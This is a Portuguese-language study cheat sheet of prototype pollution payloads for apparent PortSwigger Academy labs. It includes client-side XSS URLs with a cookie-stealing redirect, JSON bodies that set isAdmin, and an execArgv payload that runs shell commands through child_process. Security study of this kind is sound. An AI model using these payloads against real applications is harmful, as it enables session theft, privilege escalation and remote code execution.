# Prototype Pollution

Recomenda-se utilizar a extensão DOM-Invader do navegador do BurpSuite para encontrar essa vulnerabilidade.

Também surge em arquivos como: `searchLogger.js`, `searchLoggerAlternative.js` and similar `searchLogger`....

![image](https://github.com/user-attachments/assets/04d7ef6d-eb64-49b4-a92b-59d02a5f4ae3)

Se aparecer no Client-Side será utilizado para roubar cookies. No Server-Side será utilizado para escalar privilégios.

<br>

## Laboratórios

**DOM XSS via Client-Side Prototype Pollution**
```
https://site.com/?__proto__[transport_url]=data:,alert(1)
```
<br>
<br>

**DOM XSS via an Alternative Prototype Pollution Vector**
```
https://site.com/?__proto__.sequence=alert(1)-
```

<br>
<br>

Client-Side Prototype Pollution via Flawed Sanitization
```
https://site.com/?__pro__proto__to__[transport_url]=data:,alert(1)
```

<br>
<br>

Client-Side Prototype Pollution in Third-Party Libraries
```
https:/site.com/#__proto__[hitCallback]=alert(document.cookie)
```

Stealing cookie:
```
<script>
    location="https://0a910062039513c584de01ab0009004f.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```

<br>
<br>

**Client-Side Prototype Pollution via Browser APIs**
```
https://site.com/?__proto__[value]=data:,alert(1)
```

<br>
<br>

Privilege Escalation via Server-Side Prototype Pollution
```
{
...
    "__proto__": {
        "isAdmin":true
    }
}
```

<br>
<br>

**Detecting Server-Side Prototype Pollution without Polluted Property Reflection**
```
"__proto__": {
 "status":555
}
```

<br>
<br>

**Bypassing Flawed Input Filters for Server-Side Prototype Pollution**

Tente esse exploit se você perceber o header `Express framework` ou `X-Powered-By`: Express na resposta.
```
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```

<br>
<br>

**Remote Code Execution via Server-Side Prototype Pollution**
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('cat /home/carlos/morale.txt')"
    ]
}
```

> [!CAUTION]
> Eu troquei o comando acima de 'rm' para 'cat' de propósito, para evitar que você copie o comando e delete o arquivo secret do exame. Nos laboratórios, de fato você precisará usar o comando 'rm'.
